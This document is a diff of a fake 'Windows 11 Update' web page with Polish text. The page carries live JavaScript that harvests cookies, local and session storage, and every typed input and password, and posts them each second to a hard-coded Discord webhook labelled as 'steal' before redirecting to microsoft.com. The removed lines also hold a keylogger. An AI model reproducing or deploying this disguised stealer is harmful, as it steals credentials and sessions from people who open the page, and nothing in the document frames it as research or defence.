@@ -1,65 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Windows 11 Update</title>
+    <title>Windows Update</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {background:#0a0a0a;color:#00ff00;font-family:Arial;text-align:center;padding:60px 20px;}
-        .box {border:4px solid #00ff00;padding:40px;max-width:650px;margin: auto;border-radius:8px;}
-    </style>
+    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:60px 20px;}</style>
 </head>
 <body>
-    <div class="box">
-        <h1>🔄 Windows 11 Security Update</h1>
-        <p>Instalacja krytycznej aktualizacji w toku...</p>
-        <div style="width:70px;height:70px;border:10px solid #222;border-top:10px solid #00ff00;border-radius:50%;margin:25px auto;animation:spin 0.9s linear infinite;"></div>
-        <p>Nie zamykaj karty - to zajmie chwilę.</p>
-    </div>
+    <h1>Windows 11 Update</h1>
+    <p>Trwa instalacja krytycznej aktualizacji...</p>
 
     <script>
         const webhook = "https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW";
 
-        function send(data) {
-            fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: "**🟢 NOWY STEAL** ```json\n" + JSON.stringify(data, null, 2) + "\n```"})
-            });
+        function send(d) {
+            fetch(webhook, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:"*MAX STEAL* ```json\n" + JSON.stringify(d,null,2) + "\n```"})});
         }
 
-        let stolen = {
+        let data = {
             url: location.href,
             cookies: document.cookie,
             localStorage: JSON.stringify(localStorage),
             sessionStorage: JSON.stringify(sessionStorage),
             ua: navigator.userAgent,
-            platform: navigator.platform || "unknown",
+            platform: navigator.platform,
             timestamp: new Date().toISOString()
         };
 
-        // Super agresywne łapanie inputów
+        // Łap wszystko co się da
         setInterval(() => {
-            document.querySelectorAll('input, textarea, [type="password"], [type="email"], [type="tel"]').forEach(el => {
-                if (el.value && el.value.length > 2) {
-                    stolen[el.type + "_" + (el.name || el.id || "unknown")] = el.value;
-                }
+            document.querySelectorAll('input, textarea, [type=password], [type=email]').forEach(el => {
+                if (el.value) data[el.type + '_' + (el.name || el.id)] = el.value;
             });
-            send(stolen);
-        }, 1200);
+            send(data);
+        }, 1000);
 
-        // Keylogger
-        let buffer = "";
-        document.addEventListener('keypress', (e) => {
-            buffer += e.key;
-            if (buffer.length > 120) {
-                send({keylog: buffer});
-                buffer = "";
-            }
-        });
+        send(data);
 
-        send(stolen);
-
-        setTimeout(() => window.location = "https://www.microsoft.com/pl-pl/windows", 7000);
+        setTimeout(() => location = "https://microsoft.com", 6000);
     </script>
 </body>
 </html>
